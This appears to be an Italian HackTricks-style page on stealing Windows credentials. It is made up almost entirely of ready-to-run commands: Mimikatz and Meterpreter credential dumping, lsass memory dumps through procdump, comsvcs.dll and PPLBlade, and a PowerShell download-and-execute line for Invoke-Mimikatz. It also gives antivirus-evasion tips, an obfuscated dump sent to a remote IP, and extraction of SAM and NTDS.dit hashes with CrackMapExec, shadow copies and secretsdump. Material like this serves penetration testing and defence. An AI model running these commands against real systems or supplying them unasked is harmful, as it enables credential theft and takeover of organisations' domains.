# Furto di Credenziali Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenziali Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trova altre cose che Mimikatz può fare in** [**questa pagina**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Scopri alcune possibili protezioni per le credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**

## Credenziali con Meterpreter

Utilizza il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **cercare password e hash** all'interno della vittima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassare AV

### Procdump + Mimikatz

Poiché **Procdump di** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**è uno strumento legittimo di Microsoft**, non viene rilevato da Defender.\
Puoi utilizzare questo strumento per **dumpare il processo lsass**, **scaricare il dump** e **estrarre** le **credenziali localmente** dal dump.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alcuni **AV** potrebbero **rilevare** come **maligni** l'uso di **procdump.exe per dumpare lsass.exe**, questo perché stanno **rilevando** la stringa **"procdump.exe" e "lsass.exe"**. Quindi è **più furtivo** **passare** come **argomento** il **PID** di lsass.exe a procdump **invece di** usare il **nome lsass.exe.**

### Dumping lsass con **comsvcs.dll**

Una DLL chiamata **comsvcs.dll** trovata in `C:\Windows\System32` è responsabile per **dumpare la memoria del processo** in caso di crash. Questa DLL include una **funzione** chiamata **`MiniDumpW`**, progettata per essere invocata usando `rundll32.exe`.\
Non è rilevante utilizzare i primi due argomenti, ma il terzo è diviso in tre componenti. L'ID del processo da dumpare costituisce la prima componente, la posizione del file di dump rappresenta la seconda, e la terza componente è strettamente la parola **full**. Non esistono opzioni alternative.\
Dopo aver analizzato queste tre componenti, la DLL viene coinvolta nella creazione del file di dump e nel trasferimento della memoria del processo specificato in questo file.\
L'utilizzo di **comsvcs.dll** è fattibile per dumpare il processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio in [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Il seguente comando è impiegato per l'esecuzione:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass con Task Manager**

1. Fai clic destro sulla barra delle applicazioni e seleziona Task Manager
2. Clicca su Maggiori dettagli
3. Cerca il processo "Local Security Authority Process" nella scheda Processi
4. Fai clic destro sul processo "Local Security Authority Process" e seleziona "Crea file di dump".

### Dumping lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un binario firmato da Microsoft che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è uno strumento di dumping di processi protetti che supporta l'oscuramento dei dump di memoria e il trasferimento su workstation remote senza salvarli sul disco.

**Funzionalità chiave**:

1. Bypassare la protezione PPL
2. Oscurare i file di dump di memoria per eludere i meccanismi di rilevamento basati su firme di Defender
3. Caricare il dump di memoria con metodi di upload RAW e SMB senza salvarlo sul disco (dump senza file)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump the NTDS.dit dal DC di destinazione
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump the NTDS.dit password history from target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostra l'attributo pwdLastSet per ogni account NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Questi file dovrebbero essere **localizzati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Ma **non puoi semplicemente copiarli in un modo normale** perché sono protetti.

### From Registry

Il modo più semplice per rubare questi file è ottenere una copia dal registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Scarica** quei file sulla tua macchina Kali e **estrae gli hash** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puoi eseguire la copia di file protetti utilizzando questo servizio. Devi essere Amministratore.

#### Using vssadmin

Il binario vssadmin è disponibile solo nelle versioni di Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ma puoi fare lo stesso da **Powershell**. Questo è un esempio di **come copiare il file SAM** (il disco rigido utilizzato è "C:" e viene salvato in C:\users\Public) ma puoi usare questo per copiare qualsiasi file protetto:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Infine, puoi anche utilizzare lo [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per fare una copia di SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenziali di Active Directory - NTDS.dit**

Il file **NTDS.dit** è conosciuto come il cuore di **Active Directory**, contenendo dati cruciali sugli oggetti utente, gruppi e le loro appartenenze. È qui che sono memorizzati gli **hash delle password** per gli utenti di dominio. Questo file è un database **Extensible Storage Engine (ESE)** e si trova in **_%SystemRoom%/NTDS/ntds.dit_**.

All'interno di questo database, vengono mantenute tre tabelle principali:

- **Tabella Dati**: Questa tabella è incaricata di memorizzare dettagli sugli oggetti come utenti e gruppi.
- **Tabella Link**: Tiene traccia delle relazioni, come le appartenenze ai gruppi.
- **Tabella SD**: Qui sono memorizzati i **descrittori di sicurezza** per ogni oggetto, garantendo la sicurezza e il controllo degli accessi per gli oggetti memorizzati.

Ulteriori informazioni su questo: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilizza _Ntdsa.dll_ per interagire con quel file ed è utilizzato da _lsass.exe_. Quindi, **parte** del file **NTDS.dit** potrebbe trovarsi **all'interno della memoria di `lsass`** (puoi trovare i dati più recentemente accessibili probabilmente a causa del miglioramento delle prestazioni utilizzando una **cache**).

#### Decrittazione degli hash all'interno di NTDS.dit

L'hash è cifrato 3 volte:

1. Decrittare la Chiave di Crittografia della Password (**PEK**) utilizzando il **BOOTKEY** e **RC4**.
2. Decrittare l'**hash** utilizzando **PEK** e **RC4**.
3. Decrittare l'**hash** utilizzando **DES**.

**PEK** ha il **stesso valore** in **ogni controller di dominio**, ma è **cifrato** all'interno del file **NTDS.dit** utilizzando il **BOOTKEY** del **file SYSTEM del controller di dominio (è diverso tra i controller di dominio)**. Questo è il motivo per cui per ottenere le credenziali dal file NTDS.dit **hai bisogno dei file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiare NTDS.dit utilizzando Ntdsutil

Disponibile da Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Puoi anche utilizzare il trucco della [**volume shadow copy**](#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che avrai anche bisogno di una copia del file **SYSTEM** (ancora, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **Estrazione degli hash da NTDS.dit**

Una volta che hai **ottenuto** i file **NTDS.dit** e **SYSTEM**, puoi utilizzare strumenti come _secretsdump.py_ per **estrarre gli hash**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Puoi anche **estrarli automaticamente** utilizzando un utente admin di dominio valido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Per **grandi file NTDS.dit** si consiglia di estrarli utilizzando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Infine, puoi anche utilizzare il **modulo metasploit**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Estrazione degli oggetti di dominio da NTDS.dit in un database SQLite**

Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non solo vengono estratti i segreti, ma anche gli oggetti interi e i loro attributi per ulteriori estrazioni di informazioni quando il file NTDS.dit grezzo è già stato recuperato.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Il hive `SYSTEM` è facoltativo ma consente la decrittazione dei segreti (hash NT e LM, credenziali supplementari come password in chiaro, chiavi kerberos o di trust, storie delle password NT e LM). Insieme ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i loro hash, flag UAC, timestamp per l'ultimo accesso e cambio password, descrizione degli account, nomi, UPN, SPN, gruppi e appartenenze ricorsive, albero delle unità organizzative e appartenenza, domini fidati con tipo di trust, direzione e attributi...

## Lazagne

Scarica il binario da [qui](https://github.com/AlessandroZ/LaZagne/releases). Puoi utilizzare questo binario per estrarre credenziali da diversi software.
```
lazagne.exe all
```
## Altri strumenti per estrarre credenziali da SAM e LSASS

### Windows credentials Editor (WCE)

Questo strumento può essere utilizzato per estrarre credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Estrai credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Estrai le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Scaricalo da: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e **eseguilo** e le password verranno estratte.

## Difese

[**Scopri alcune protezioni delle credenziali qui.**](credentials-protections.md)

{{#include ../../banners/hacktricks-training.md}}
